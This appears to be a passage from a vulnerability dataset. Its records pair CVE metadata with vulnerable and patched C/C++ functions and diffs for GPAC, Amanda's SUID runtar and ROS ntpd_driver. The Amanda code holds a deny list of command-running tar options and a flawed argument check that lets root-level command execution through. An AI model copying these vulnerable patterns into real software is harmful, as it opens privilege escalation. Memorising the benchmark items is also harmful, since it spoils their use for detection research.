				VAR_9->matrix_coeffs = gf_bs_read_int_log(VAR_0, 8, ""matrix_coefficients"");
			}
		}

		if ((VAR_9->chroma_loc_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""chroma_loc_info_present_flag""))) {
			VAR_9->chroma_sample_loc_type_top_field = gf_bs_read_ue_log(VAR_0, ""chroma_sample_loc_type_top_field"");
			VAR_9->chroma_sample_loc_type_bottom_field = gf_bs_read_ue_log(VAR_0, ""chroma_sample_loc_type_bottom_field"");
		}

		VAR_9->neutral_chroma_indication_flag = gf_bs_read_int_log(VAR_0, 1, ""neutral_chroma_indication_flag"");
		VAR_9->field_seq_flag = gf_bs_read_int_log(VAR_0, 1, ""field_seq_flag"");
		VAR_9->frame_field_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""frame_field_info_present_flag"");

		if ((VAR_9->default_display_window_flag = gf_bs_read_int_log(VAR_0, 1, ""default_display_window_flag""))) {
			VAR_9->left_offset = gf_bs_read_ue_log(VAR_0, ""display_window_left_offset"");
			VAR_9->right_offset = gf_bs_read_ue_log(VAR_0, ""display_window_right_offset"");
			VAR_9->top_offset = gf_bs_read_ue_log(VAR_0, ""display_window_top_offset"");
			VAR_9->bottom_offset = gf_bs_read_ue_log(VAR_0, ""display_window_bottom_offset"");
		}

		VAR_9->has_timing_info = gf_bs_read_int_log(VAR_0, 1, ""has_timing_info"");
		if (VAR_9->has_timing_info) {
			VAR_9->num_units_in_tick = gf_bs_read_int_log(VAR_0, 32, ""num_units_in_tick"");
			VAR_9->time_scale = gf_bs_read_int_log(VAR_0, 32, ""time_scale"");
			VAR_9->poc_proportional_to_timing_flag = gf_bs_read_int_log(VAR_0, 1, ""poc_proportional_to_timing_flag"");
			if (VAR_9->poc_proportional_to_timing_flag)
				VAR_9->num_ticks_poc_diff_one_minus1 = gf_bs_read_ue_log(VAR_0, ""num_ticks_poc_diff_one_minus1"");
			if ((VAR_9->hrd_parameters_present_flag = gf_bs_read_int_log(VAR_0, 1, ""hrd_parameters_present_flag""))) {
				/* COMMENT_6 */
				return VAR_5;
			}
		}

		if (gf_bs_read_int_log(VAR_0, 1, ""bitstream_restriction_flag"")) {
			gf_bs_read_int_log(VAR_0, 1, ""tiles_fixed_structure_flag"");
			gf_bs_read_int_log(VAR_0, 1, ""motion_vectors_over_pic_boundaries_flag"");
			gf_bs_read_int_log(VAR_0, 1, ""restricted_ref_pic_lists_flag"");
			gf_bs_read_ue_log(VAR_0, ""min_spatial_segmentation_idc"");
			gf_bs_read_ue_log(VAR_0, ""max_bytes_per_pic_denom"");
			gf_bs_read_ue_log(VAR_0, ""max_bits_per_min_cu_denom"");
			gf_bs_read_ue_log(VAR_0, ""log2_max_mv_length_horizontal"");
			gf_bs_read_ue_log(VAR_0, ""log2_max_mv_length_vertical"");
		}
	}

	if (gf_bs_read_int_log(VAR_0, 1, ""sps_extension_flag"")) {
#if 0
		while (gf_bs_available(VAR_0)) {
			/* COMMENT_7 */ gf_bs_read_int(VAR_0, 1);
		}
#endif

	}

	return VAR_5;
}",gpac/6bb3e4e288f02c9c595e63230979cd5443a1cb7a/av_parsers.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -115,6 +115,10 @@
 
 	sps->log2_min_luma_coding_block_size = 3 + gf_bs_read_ue_log(bs, ""log2_min_luma_coding_block_size_minus3"");
 	sps->log2_diff_max_min_luma_coding_block_size = gf_bs_read_ue_log(bs, ""log2_diff_max_min_luma_coding_block_size"");
+	//we allow more than in max profile, but make sure we don't overflow max CU W/H compute below
+	if (sps->log2_min_luma_coding_block_size + sps->log2_diff_max_min_luma_coding_block_size >= 30) {
+		return -1;
+	}
 	sps->max_CU_width = (1 << (sps->log2_min_luma_coding_block_size + sps->log2_diff_max_min_luma_coding_block_size));
 	sps->max_CU_height = (1 << (sps->log2_min_luma_coding_block_size + sps->log2_diff_max_min_luma_coding_block_size));
 ","{'deleted_lines': [], 'added_lines': [""\t//we allow more than in max profile, but make sure we don't overflow max CU W/H compute below"", '\tif (sps->log2_min_luma_coding_block_size + sps->log2_diff_max_min_luma_coding_block_size >= 30) {', '\t\treturn -1;', '\t}']}",True,GPAC MP4box 2.1-DEV-rev574-g9d5bb184b is contains an Integer overflow vulnerability in gf_hevc_read_sps_bs_internal function of media_tools/av_parsers.c:8316,7.1,HIGH,2,valid,2022-12-12T09:58:50Z,4
CVE-2022-37704,['CWE-77'],CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H,1,zmanda/amanda,"fix : fix increment logic for good_option

- for arguements of type --file=x or --file x, fixed logic while incrementing value.",43c5b32f46186f3ed78fe6c7503096fa9ad1236c,https://github.com/zmanda/amanda/commit/43c5b32f46186f3ed78fe6c7503096fa9ad1236c,client-src/runtar.c,main,"int
main(
intargc,
char **argv)
{
#ifdef GNUTAR
int i;
char *e;
char *dbf;
char *cmdline;
GPtrArray *array = g_ptr_array_new();
gchar **strings;
char **new_argv;
char **env;
char *my_realpath = NULL;
#endif
int good_option;
glib_init();
if (argc > 1 && argv[1] && g_str_equal(argv[1], ""--version"")) {
printf(""runtar-%s\n"", VERSION);
return (0);
}
setlocale(LC_MESSAGES, ""C"");
textdomain(""amanda""); 
safe_fd(-1, 0);
safe_cd();
set_pname(""runtar"");
signal(SIGPIPE, SIG_IGN);
dbopen(DBG_SUBDIR_CLIENT);
config_init(CONFIG_INIT_CLIENT|CONFIG_INIT_GLOBAL, NULL);
if (argc < 3) {
error(_(""Need at least 3 arguments\n""));
}
dbprintf(_(""version %s\n""), VERSION);
if (!g_str_equal(argv[3], ""--create"")) {
error(_(""Can only be used to create tar archives\n""));
}
#ifndef GNUTAR
g_fprintf(stderr,_(""gnutar not available on this system.\n""));
dbprintf(_(""%s: gnutar not available on this system.\n""), argv[0]);
dbclose();
return 1;
#else
do {
FILE *version_file;
charversion_buf[80];
if ((version_file = popen(GNUTAR "" --version 2>&1"", ""r"")) != NULL) {
if (fgets(version_buf, (int)sizeof(version_buf), version_file) != NULL) {
dbprintf(_(GNUTAR "" version: %s\n""), version_buf);
} else {
if (ferror(version_file)) {
dbprintf(_(GNUTAR "" version: Read failure: %s\n""), strerror(errno));
} else {
dbprintf(_(GNUTAR "" version: Read failure; EOF\n""));
}
}
} else {
dbprintf(_(GNUTAR "" version: unavailable: %s\n""), strerror(errno));
}
} while(0);
#ifdef WANT_SETUID_CLIENT
check_running_as(RUNNING_AS_CLIENT_LOGIN | RUNNING_AS_UID_ONLY);
if (!become_root()) {
error(_(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
}
#else
check_running_as(RUNNING_AS_CLIENT_LOGIN);
#endif
argc--;
argv++;
dbprintf(_(""config: %s\n""), argv[0]);
if (!g_str_equal(argv[0], ""NOCONFIG""))
dbrename(argv[0], DBG_SUBDIR_CLIENT);
argc--;
argv++;
new_argv = g_new0(char *, argc+1);
if (!check_exec_for_suid(""GNUTAR_PATH"", GNUTAR, stderr, &my_realpath)) {
dbclose();
exit(1);
}
new_argv[0] = g_strdup_printf(""%s"", argv[0]);
g_ptr_array_add(array, g_strdup(my_realpath));
good_option = 0;
for (i = 1; argv[i]; i++) {
if (good_option <= 0) {
if (g_str_has_prefix(argv[i],""--rsh-command"") ||
g_str_has_prefix(argv[i],""--to-command"") ||
g_str_has_prefix(argv[i],""--info-script"") ||
g_str_has_prefix(argv[i],""--new-volume-script"") ||
g_str_has_prefix(argv[i],""--rmt-command"") ||
g_str_has_prefix(argv[i],""--use-compress-program"")) {
good_option = 0;
} else if (g_str_has_prefix(argv[i],""--create"") ||
g_str_has_prefix(argv[i],""--totals"") ||
g_str_has_prefix(argv[i],""--dereference"") ||
g_str_has_prefix(argv[i],""--no-recursion"") ||
g_str_has_prefix(argv[i],""--one-file-system"") ||
g_str_has_prefix(argv[i],""--incremental"") ||
g_str_has_prefix(argv[i],""--atime-preserve"") ||
g_str_has_prefix(argv[i],""--sparse"") ||
g_str_has_prefix(argv[i],""--ignore-failed-read"") ||
g_str_has_prefix(argv[i],""--numeric-owner"") ||
g_str_has_prefix(argv[i],""--verbose"")) {
good_option++;
} else if (g_str_has_prefix(argv[i],""--blocking-factor"") ||
g_str_has_prefix(argv[i],""--file"") ||
g_str_has_prefix(argv[i],""--directory"") ||
g_str_has_prefix(argv[i],""--exclude"") ||
g_str_has_prefix(argv[i],""--transform"") ||
g_str_has_prefix(argv[i],""--listed-incremental"") ||
g_str_has_prefix(argv[i],""--newer"") ||
g_str_has_prefix(argv[i],""--exclude-from"") ||
g_str_has_prefix(argv[i],""--files-from"")) {
good_option += 2;
} else if (argv[i][0] != '-') {
good_option++;
}
}
if (good_option <= 0) {
error(""error [%s invalid option: %s]"", get_pname(), argv[i]);
}
g_ptr_array_add(array, quote_string(argv[i]));
new_argv[i] = g_strdup_printf(""%s"", argv[i]);
good_option--;
}
g_ptr_array_add(array, NULL);
strings = (gchar **)g_ptr_array_free(array, FALSE);
cmdline = g_strjoinv("" "", strings);
g_strfreev(strings);
dbprintf(_(""running: %s\n""), cmdline);
amfree(cmdline);
dbf = dbfn();
if (dbf) {
dbf = g_strdup(dbf);
}
dbclose();
env = safe_env();
execve(my_realpath, new_argv, env);
free_env(env);
free_env(new_argv);
e = strerror(errno);
dbreopen(dbf, ""more"");
amfree(dbf);
dbprintf(_(""execve of %s failed (%s)\n""), my_realpath, e);
dbclose();
g_fprintf(stderr, _(""runtar: could not exec %s: %s\n""), my_realpath, e);
g_free(my_realpath);
return 1;
#endif
}","int
main(
intVAR_0,
char **VAR_1)
{
#ifdef VAR_2
int VAR_3;
char *VAR_4;
char *VAR_5;
char *VAR_6;
GPtrArray *VAR_7 = g_ptr_array_new();
gchar **VAR_8;
char **VAR_9;
char **VAR_10;
char *VAR_11 = NULL;
#endif
int VAR_12;
glib_init();
if (VAR_0 > 1 && VAR_1[1] && g_str_equal(VAR_1[1], ""--version"")) {
printf(""runtar-%s\n"", VAR_13);
return (0);
}
setlocale(VAR_14, ""C"");
textdomain(""amanda""); 
safe_fd(-1, 0);
safe_cd();
set_pname(""runtar"");
signal(VAR_15, VAR_16);
dbopen(VAR_17);
config_init(VAR_18|VAR_19, NULL);
if (VAR_0 < 3) {
error(_(""Need at least 3 arguments\n""));
}
dbprintf(_(""version %s\n""), VAR_13);
if (!g_str_equal(VAR_1[3], ""--create"")) {
error(_(""Can only be used to create tar archives\n""));
}
#ifndef VAR_2
g_fprintf(VAR_20,_(""gnutar not available on this system.\n""));
dbprintf(_(""%s: gnutar not available on this system.\n""), VAR_1[0]);
dbclose();
return 1;
#else
do {
FILE *VAR_21;
charVAR_22[80];
if ((VAR_21 = popen(VAR_2 "" --version 2>&1"", ""r"")) != NULL) {
if (fgets(VAR_22, (int)sizeof(VAR_22), VAR_21) != NULL) {
VAR_23(VAR_24(VAR_2 "" version: %s\n""), VAR_22);
} else {
if (ferror(VAR_21)) {
VAR_23(VAR_24(VAR_2 "" version: Read failure: %s\n""), strerror(VAR_25));
} else {
VAR_23(VAR_24(VAR_2 "" version: Read failure; EOF\n""));
}
}
} else {
VAR_23(VAR_24(VAR_2 "" version: unavailable: %s\n""), strerror(VAR_25));
}
} while(0);
#ifdef VAR_26
check_running_as(VAR_27 | VAR_28);
if (!become_root()) {
error(VAR_24(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
}
#else
check_running_as(VAR_27);
#endif
VAR_0--;
VAR_1++;
VAR_23(VAR_24(""config: %s\n""), VAR_1[0]);
if (!g_str_equal(VAR_1[0], ""NOCONFIG""))
dbrename(VAR_1[0], VAR_17);
VAR_0--;
VAR_1++;
VAR_9 = g_new0(char *, VAR_0+1);
if (!check_exec_for_suid(""GNUTAR_PATH"", VAR_2, VAR_20, &VAR_11)) {
dbclose();
exit(1);
}
VAR_9[0] = g_strdup_printf(""%s"", VAR_1[0]);
g_ptr_array_add(VAR_7, g_strdup(VAR_11));
VAR_12 = 0;
for (VAR_3 = 1; VAR_1[VAR_3]; VAR_3++) {
if (VAR_12 <= 0) {
if (g_str_has_prefix(VAR_1[VAR_3],""--rsh-command"") ||
g_str_has_prefix(VAR_1[VAR_3],""--to-command"") ||
g_str_has_prefix(VAR_1[VAR_3],""--info-script"") ||
g_str_has_prefix(VAR_1[VAR_3],""--new-volume-script"") ||
g_str_has_prefix(VAR_1[VAR_3],""--rmt-command"") ||
g_str_has_prefix(VAR_1[VAR_3],""--use-compress-program"")) {
VAR_12 = 0;
} else if (g_str_has_prefix(VAR_1[VAR_3],""--create"") ||
g_str_has_prefix(VAR_1[VAR_3],""--totals"") ||
g_str_has_prefix(VAR_1[VAR_3],""--dereference"") ||
g_str_has_prefix(VAR_1[VAR_3],""--no-recursion"") ||
g_str_has_prefix(VAR_1[VAR_3],""--one-file-system"") ||
g_str_has_prefix(VAR_1[VAR_3],""--incremental"") ||
g_str_has_prefix(VAR_1[VAR_3],""--atime-preserve"") ||
g_str_has_prefix(VAR_1[VAR_3],""--sparse"") ||
g_str_has_prefix(VAR_1[VAR_3],""--ignore-failed-read"") ||
g_str_has_prefix(VAR_1[VAR_3],""--numeric-owner"") ||
g_str_has_prefix(VAR_1[VAR_3],""--verbose"")) {
VAR_12++;
} else if (g_str_has_prefix(VAR_1[VAR_3],""--blocking-factor"") ||
g_str_has_prefix(VAR_1[VAR_3],""--file"") ||
g_str_has_prefix(VAR_1[VAR_3],""--directory"") ||
g_str_has_prefix(VAR_1[VAR_3],""--exclude"") ||
g_str_has_prefix(VAR_1[VAR_3],""--transform"") ||
g_str_has_prefix(VAR_1[VAR_3],""--listed-incremental"") ||
g_str_has_prefix(VAR_1[VAR_3],""--newer"") ||
g_str_has_prefix(VAR_1[VAR_3],""--exclude-from"") ||
g_str_has_prefix(VAR_1[VAR_3],""--files-from"")) {
VAR_12 += 2;
} else if (VAR_1[VAR_3][0] != '-') {
VAR_12++;
}
}
if (VAR_12 <= 0) {
error(""error [%s invalid option: %s]"", get_pname(), VAR_1[VAR_3]);
}
g_ptr_array_add(VAR_7, quote_string(VAR_1[VAR_3]));
VAR_9[VAR_3] = g_strdup_printf(""%s"", VAR_1[VAR_3]);
VAR_12--;
}
g_ptr_array_add(VAR_7, NULL);
VAR_8 = (gchar **)g_ptr_array_free(VAR_7, FALSE);
VAR_6 = g_strjoinv("" "", VAR_8);
g_strfreev(VAR_8);
VAR_23(VAR_24(""running: %s\n""), VAR_6);
amfree(VAR_6);
VAR_5 = dbfn();
if (VAR_5) {
VAR_5 = g_strdup(VAR_5);
}
dbclose();
VAR_10 = safe_env();
execve(VAR_11, VAR_9, VAR_10);
free_env(VAR_10);
free_env(VAR_9);
VAR_4 = strerror(VAR_25);
dbreopen(VAR_5, ""more"");
amfree(VAR_5);
VAR_23(VAR_24(""execve of %s failed (%s)\n""), VAR_11, VAR_4);
dbclose();
g_fprintf(VAR_20, VAR_24(""runtar: could not exec %s: %s\n""), VAR_11, VAR_4);
g_free(VAR_11);
return 1;
#endif
}",zmanda/amanda/43c5b32f46186f3ed78fe6c7503096fa9ad1236c/runtar.c/vul/before/0.json,"int
main(
    int		argc,
    char **	argv)
{
#ifdef GNUTAR
    int i;
    char *e;
    char *dbf;
    char *cmdline;
    GPtrArray *array = g_ptr_array_new();
    gchar **strings;
    char **new_argv;
    char **env;
    char *my_realpath = NULL;
#endif
    int good_option;

    glib_init();

    if (argc > 1 && argv[1] && g_str_equal(argv[1], ""--version"")) {
	printf(""runtar-%s\n"", VERSION);
	return (0);
    }

    /*
     * Configure program for internationalization:
     *   1) Only set the message locale for now.
     *   2) Set textdomain for all amanda related programs to ""amanda""
     *      We don't want to be forced to support dozens of message catalogs.
     */
    setlocale(LC_MESSAGES, ""C"");
    textdomain(""amanda""); 

    safe_fd(-1, 0);
    safe_cd();

    set_pname(""runtar"");

    /* Don't die when child closes pipe */
    signal(SIGPIPE, SIG_IGN);

    dbopen(DBG_SUBDIR_CLIENT);
    config_init(CONFIG_INIT_CLIENT|CONFIG_INIT_GLOBAL, NULL);

    if (argc < 3) {
	error(_(""Need at least 3 arguments\n""));
	/*NOTREACHED*/
    }

    dbprintf(_(""version %s\n""), VERSION);

    if (!g_str_equal(argv[3], ""--create"")) {
	error(_(""Can only be used to create tar archives\n""));
	/*NOTREACHED*/
    }

#ifndef GNUTAR

    g_fprintf(stderr,_(""gnutar not available on this system.\n""));
    dbprintf(_(""%s: gnutar not available on this system.\n""), argv[0]);
    dbclose();
    return 1;

#else

    /*
     * Print out version information for tar.
     */
    do {
	FILE *	version_file;
	char	version_buf[80];

	if ((version_file = popen(GNUTAR "" --version 2>&1"", ""r"")) != NULL) {
	    if (fgets(version_buf, (int)sizeof(version_buf), version_file) != NULL) {
		dbprintf(_(GNUTAR "" version: %s\n""), version_buf);
	    } else {
		if (ferror(version_file)) {
		    dbprintf(_(GNUTAR "" version: Read failure: %s\n""), strerror(errno));
		} else {
		    dbprintf(_(GNUTAR "" version: Read failure; EOF\n""));
		}
	    }
	} else {
	    dbprintf(_(GNUTAR "" version: unavailable: %s\n""), strerror(errno));
	}
    } while(0);

#ifdef WANT_SETUID_CLIENT
    check_running_as(RUNNING_AS_CLIENT_LOGIN | RUNNING_AS_UID_ONLY);
    if (!become_root()) {
	error(_(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
	/*NOTREACHED*/
    }
#else
    check_running_as(RUNNING_AS_CLIENT_LOGIN);
#endif

    /* skip argv[0] */
    argc--;
    argv++;

    dbprintf(_(""config: %s\n""), argv[0]);
    if (!g_str_equal(argv[0], ""NOCONFIG""))
	dbrename(argv[0], DBG_SUBDIR_CLIENT);
    argc--;
    argv++;

    new_argv = g_new0(char *, argc+1);

    if (!check_exec_for_suid(""GNUTAR_PATH"", GNUTAR, stderr, &my_realpath)) {
	dbclose();
	exit(1);
    }
    new_argv[0] = g_strdup_printf(""%s"", argv[0]);
    g_ptr_array_add(array, g_strdup(my_realpath));
    good_option = 0;
    for (i = 1; argv[i]; i++) {
	if (good_option <= 0) {
	    if (g_str_has_prefix(argv[i],""--rsh-command"") ||
		g_str_has_prefix(argv[i],""--to-command"") ||
		g_str_has_prefix(argv[i],""--info-script"") ||
		g_str_has_prefix(argv[i],""--new-volume-script"") ||
		g_str_has_prefix(argv[i],""--rmt-command"") ||
		g_str_has_prefix(argv[i],""--use-compress-program"")) {
		/* Filter potential malicious option */
		good_option = 0;
	    } else if (g_str_has_prefix(argv[i],""--create"") ||
		g_str_has_prefix(argv[i],""--totals"") ||
		g_str_has_prefix(argv[i],""--dereference"") ||
		g_str_has_prefix(argv[i],""--no-recursion"") ||
		g_str_has_prefix(argv[i],""--one-file-system"") ||
		g_str_has_prefix(argv[i],""--incremental"") ||
		g_str_has_prefix(argv[i],""--atime-preserve"") ||
		g_str_has_prefix(argv[i],""--sparse"") ||
		g_str_has_prefix(argv[i],""--ignore-failed-read"") ||
		g_str_has_prefix(argv[i],""--numeric-owner"") ||
		g_str_has_prefix(argv[i],""--verbose"")) {
		/* Accept theses options */
		good_option++;
	    } else if (g_str_has_prefix(argv[i],""--blocking-factor"") ||
		g_str_has_prefix(argv[i],""--file"") ||
		g_str_has_prefix(argv[i],""--directory"") ||
		g_str_has_prefix(argv[i],""--exclude"") ||
		g_str_has_prefix(argv[i],""--transform"") ||
		g_str_has_prefix(argv[i],""--listed-incremental"") ||
		g_str_has_prefix(argv[i],""--newer"") ||
		g_str_has_prefix(argv[i],""--exclude-from"") ||
		g_str_has_prefix(argv[i],""--files-from"")) {
		good_option++;
	    } else if (argv[i][0] != '-') {
		/* argument values are accounted for here */
		good_option++;
	    }
	}
	if (good_option <= 0) {
	    error(""error [%s invalid option: %s]"", get_pname(), argv[i]);
	}
        g_ptr_array_add(array, quote_string(argv[i]));
	new_argv[i] = g_strdup_printf(""%s"", argv[i]);
	good_option--;
    }

    g_ptr_array_add(array, NULL);
    strings = (gchar **)g_ptr_array_free(array, FALSE);

    cmdline = g_strjoinv("" "", strings);
    g_strfreev(strings);

    dbprintf(_(""running: %s\n""), cmdline);
    amfree(cmdline);

    dbf = dbfn();
    if (dbf) {
	dbf = g_strdup(dbf);
    }
    dbclose();

    env = safe_env();
    execve(my_realpath, new_argv, env);
    free_env(env);
    free_env(new_argv);

    e = strerror(errno);
    dbreopen(dbf, ""more"");
    amfree(dbf);
    dbprintf(_(""execve of %s failed (%s)\n""), my_realpath, e);
    dbclose();

    g_fprintf(stderr, _(""runtar: could not exec %s: %s\n""), my_realpath, e);
    g_free(my_realpath);
    return 1;
#endif
}","int
main(
    int		VAR_0,
    char **	VAR_1)
{
#ifdef VAR_2
    int VAR_3;
    char *VAR_4;
    char *VAR_5;
    char *VAR_6;
    GPtrArray *VAR_7 = g_ptr_array_new();
    gchar **VAR_8;
    char **VAR_9;
    char **VAR_10;
    char *VAR_11 = NULL;
#endif
    int VAR_12;

    glib_init();

    if (VAR_0 > 1 && VAR_1[1] && g_str_equal(VAR_1[1], ""--version"")) {
	printf(""runtar-%s\n"", VAR_13);
	return (0);
    }

    /* COMMENT_0 */
                                                  
                                                
                                                                      
                                                                             
       
    setlocale(VAR_14, ""C"");
    textdomain(""amanda""); 

    safe_fd(-1, 0);
    safe_cd();

    set_pname(""runtar"");

    /* COMMENT_6 */
    signal(VAR_15, VAR_16);

    dbopen(VAR_17);
    config_init(VAR_18|VAR_19, NULL);

    if (VAR_0 < 3) {
	error(_(""Need at least 3 arguments\n""));
	/* COMMENT_7 */
    }

    dbprintf(_(""version %s\n""), VAR_13);

    if (!g_str_equal(VAR_1[3], ""--create"")) {
	error(_(""Can only be used to create tar archives\n""));
	/* COMMENT_7 */
    }

#ifndef VAR_2

    g_fprintf(VAR_20,_(""gnutar not available on this system.\n""));
    dbprintf(_(""%s: gnutar not available on this system.\n""), VAR_1[0]);
    dbclose();
    return 1;

#else

    /* COMMENT_8 */
                                             
       
    do {
	FILE *	VAR_21;
	char	VAR_22[80];

	if ((VAR_21 = popen(VAR_2 "" --version 2>&1"", ""r"")) != NULL) {
	    if (fgets(VAR_22, (int)sizeof(VAR_22), VAR_21) != NULL) {
		VAR_23(VAR_24(VAR_2 "" version: %s\n""), VAR_22);
	    } else {
		if (ferror(VAR_21)) {
		    VAR_23(VAR_24(VAR_2 "" version: Read failure: %s\n""), strerror(VAR_25));
		} else {
		    VAR_23(VAR_24(VAR_2 "" version: Read failure; EOF\n""));
		}
	    }
	} else {
	    VAR_23(VAR_24(VAR_2 "" version: unavailable: %s\n""), strerror(VAR_25));
	}
    } while(0);

#ifdef VAR_26
    check_running_as(VAR_27 | VAR_28);
    if (!become_root()) {
	error(VAR_24(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
	/* COMMENT_7 */
    }
#else
    check_running_as(VAR_27);
#endif

    /* COMMENT_11 */
    VAR_0--;
    VAR_1++;

    VAR_23(VAR_24(""config: %s\n""), VAR_1[0]);
    if (!g_str_equal(VAR_1[0], ""NOCONFIG""))
	dbrename(VAR_1[0], VAR_17);
    VAR_0--;
    VAR_1++;

    VAR_9 = g_new0(char *, VAR_0+1);

    if (!check_exec_for_suid(""GNUTAR_PATH"", VAR_2, VAR_20, &VAR_11)) {
	dbclose();
	exit(1);
    }
    VAR_9[0] = g_strdup_printf(""%s"", VAR_1[0]);
    g_ptr_array_add(VAR_7, g_strdup(VAR_11));
    VAR_12 = 0;
    for (VAR_3 = 1; VAR_1[VAR_3]; VAR_3++) {
	if (VAR_12 <= 0) {
	    if (g_str_has_prefix(VAR_1[VAR_3],""--rsh-command"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--to-command"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--info-script"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--new-volume-script"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--rmt-command"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--use-compress-program"")) {
		/* COMMENT_12 */
		VAR_12 = 0;
	    } else if (g_str_has_prefix(VAR_1[VAR_3],""--create"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--totals"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--dereference"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--no-recursion"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--one-file-system"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--incremental"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--atime-preserve"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--sparse"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--ignore-failed-read"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--numeric-owner"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--verbose"")) {
		/* COMMENT_13 */
		VAR_12++;
	    } else if (g_str_has_prefix(VAR_1[VAR_3],""--blocking-factor"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--file"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--directory"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--exclude"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--transform"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--listed-incremental"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--newer"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--exclude-from"") ||
		g_str_has_prefix(VAR_1[VAR_3],""--files-from"")) {
		VAR_12++;
	    } else if (VAR_1[VAR_3][0] != '-') {
		/* COMMENT_14 */
		VAR_12++;
	    }
	}
	if (VAR_12 <= 0) {
	    error(""error [%s invalid option: %s]"", get_pname(), VAR_1[VAR_3]);
	}
        g_ptr_array_add(VAR_7, quote_string(VAR_1[VAR_3]));
	VAR_9[VAR_3] = g_strdup_printf(""%s"", VAR_1[VAR_3]);
	VAR_12--;
    }

    g_ptr_array_add(VAR_7, NULL);
    VAR_8 = (gchar **)g_ptr_array_free(VAR_7, FALSE);

    VAR_6 = g_strjoinv("" "", VAR_8);
    g_strfreev(VAR_8);

    VAR_23(VAR_24(""running: %s\n""), VAR_6);
    amfree(VAR_6);

    VAR_5 = dbfn();
    if (VAR_5) {
	VAR_5 = g_strdup(VAR_5);
    }
    dbclose();

    VAR_10 = safe_env();
    execve(VAR_11, VAR_9, VAR_10);
    free_env(VAR_10);
    free_env(VAR_9);

    VAR_4 = strerror(VAR_25);
    dbreopen(VAR_5, ""more"");
    amfree(VAR_5);
    VAR_23(VAR_24(""execve of %s failed (%s)\n""), VAR_11, VAR_4);
    dbclose();

    g_fprintf(VAR_20, VAR_24(""runtar: could not exec %s: %s\n""), VAR_11, VAR_4);
    g_free(VAR_11);
    return 1;
#endif
}",zmanda/amanda/43c5b32f46186f3ed78fe6c7503096fa9ad1236c/runtar.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -147,9 +147,9 @@
 		g_str_has_prefix(argv[i],""--newer"") ||
 		g_str_has_prefix(argv[i],""--exclude-from"") ||
 		g_str_has_prefix(argv[i],""--files-from"")) {
-		/* Accept theses options with the following argument */
-		good_option += 2;
+		good_option++;
 	    } else if (argv[i][0] != '-') {
+		/* argument values are accounted for here */
 		good_option++;
 	    }
 	}","{'deleted_lines': ['\t\t/* Accept theses options with the following argument */', '\t\tgood_option += 2;'], 'added_lines': ['\t\tgood_option++;', '\t\t/* argument values are accounted for here */']}",True,"Amanda 3.5.1 allows privilege escalation from the regular user backup to root. The SUID binary located at /lib/amanda/rundump will execute /usr/sbin/dump as root with controlled arguments from the attacker which may lead to escalation of privileges, denial of service, and information disclosure.",6.7,MEDIUM,1,valid,2022-12-22T17:37:30Z,4
CVE-2022-48198,['CWE-668'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,vooon/ntpd_driver,"shm_driver: remove time_ref topic parameter to improve secutiry, please use remap

Fixes #9",063eb917c88f8a965d4988501a4ff54441440c42,https://github.com/vooon/ntpd_driver/commit/063eb917c88f8a965d4988501a4ff54441440c42,src/shm_driver.cpp,main,"int main(int argc, char *argv[])
{
ros::init(argc, argv, ""ntpd_shm"");
ros::NodeHandle nh(""~"");
ros::Subscriber time_ref_sub;
int shm_unit;
std::string time_ref_topic;
signal(SIGINT, sig_handler);
nh.param(""shm_unit"", shm_unit, 2);
nh.param(""fixup_date"", g_set_date, false);
nh.param<std::string>(""time_ref_topic"", time_ref_topic, ""time_ref"");
ROS_INFO_STREAM(""NTP time source: "" << ros::names::resolve(time_ref_topic, true));
ROS_INFO_STREAM(""NTP date fixup: "" << ((g_set_date) ? ""enabled"" : ""disabled""));
g_shm = get_shmTime(shm_unit);
if (g_shm == NULL)
return 1;
time_ref_sub = nh.subscribe(time_ref_topic, 10, time_ref_cb,
ros::TransportHints()
.unreliable().maxDatagramSize(1024)
.reliable().tcpNoDelay(true));
ros::spin();
put_shmTime(&g_shm);
return 0;
}","int main(int VAR_0, char *VAR_1[])
{
ros::init(VAR_0, VAR_1, ""ntpd_shm"");
ros::NodeHandle VAR_2(""~"");
ros::Subscriber VAR_3;
int VAR_4;
std::string VAR_5;
signal(VAR_6, VAR_7);
VAR_2.param(""shm_unit"", VAR_4, 2);
VAR_2.param(""fixup_date"", VAR_8, false);
VAR_2.param<std::string>(""time_ref_topic"", VAR_5, ""time_ref"");
ROS_INFO_STREAM(""NTP time source: "" << ros::names::resolve(VAR_5, true));
ROS_INFO_STREAM(""NTP date fixup: "" << ((VAR_8) ? ""enabled"" : ""disabled""));
VAR_9 = get_shmTime(VAR_4);
if (VAR_9 == NULL)
return 1;
VAR_3 = VAR_2.subscribe(VAR_5, 10, VAR_10,
ros::TransportHints()
.unreliable().maxDatagramSize(1024)
.reliable().tcpNoDelay(true));
ros::spin();
put_shmTime(&VAR_9);
return 0;
